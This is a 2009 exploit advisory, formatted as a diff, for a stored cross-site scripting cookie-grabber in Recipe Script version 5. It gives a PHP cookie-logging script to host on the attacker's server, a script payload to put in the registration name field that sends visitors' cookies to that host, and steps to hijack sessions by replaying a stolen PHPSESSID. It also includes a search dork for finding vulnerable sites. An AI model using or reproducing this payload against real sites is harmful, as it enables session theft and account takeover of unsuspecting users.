@@ -1,0 +1,41 @@
+#################################################################################################################
+[+] The Recipe Script version 5 Cookie Grabber Exploit
+[+] Discovered By ThE g0bL!N
+[+] Greetz : All my friends-Sec-r1z.com ( A good site if you want to learn :) )
+[+] Vendor:http://recipescript.com/
+[+] Dork"script by RECIPE SCRIPT"
+#################################################################################################################
+PoC
+--
+[+] Make 2 files and upload to your host :
+[+]cookie.php  - > Put in this File That Code:
+ <?php
+ $cookie = $_GET['cookie'];
+ $log = fopen("log.txt", "a");
+ fwrite($log, $cookie ."\n");
+ fclose($log);
+ ?>
+[+]log.txt   - > CHMOD it 777 and put in the same directory with cookie.php
+ 
+[+]Exploit:
+   -------
+           1)First Register in the site  In Fisrt Name:  Put That code
+           2) <script>document.location ="http://localhost/[path]/cookie.php?cookie=" + document.cookie;</script>
+           3)Then After Complete Registration Go to add_recipe.php To add recipe
+           4)Add a normal Recipe
+           5) The Victim Open page of recipes recipes.php
+           6)The js code Worked 
+Example
+-------
+Result:
+------
+ PHPSESSID:aafaa0f2cad7431d5cec1431e5bafb03
+ Then we put that code
+ javascript:document.cookie="PHPSESSID=aafaa0f2cad7431d5cec1431e5bafb03;path=/";
+ After That you see :
+ ThE g0bL!N
+ Profile
+ Log off
+################################################################################################################
+
+# milw0rm.com [2009-06-15]
